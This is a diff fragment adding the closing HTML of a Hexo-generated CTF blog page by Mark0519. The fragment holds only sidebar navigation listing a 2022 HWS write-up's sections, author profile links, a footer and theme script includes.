+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WP-2022-HWS"><span class="nav-number">1.</span> <span class="nav-text">[WP]-2022 HWS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%81%E5%88%86%E9%A2%98"><span class="nav-number">1.0.1.</span> <span class="nav-text">送分题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#peach"><span class="nav-number">1.0.2.</span> <span class="nav-text">peach</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Mark0519"
+      src="https://pic.imgdb.cn/item/5fbd287eb18d627113535cf8.png">
+  <p class="site-author-name" itemprop="name">Mark0519</p>
+  <div class="site-description" itemprop="description">菜鸡CTFer的自留地</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">66</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">22</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/mark0519" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;mark0519" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:sunjiajun@bupt.edu.cn" title="E-Mail → mailto:sunjiajun@bupt.edu.cn" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Mark0519</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
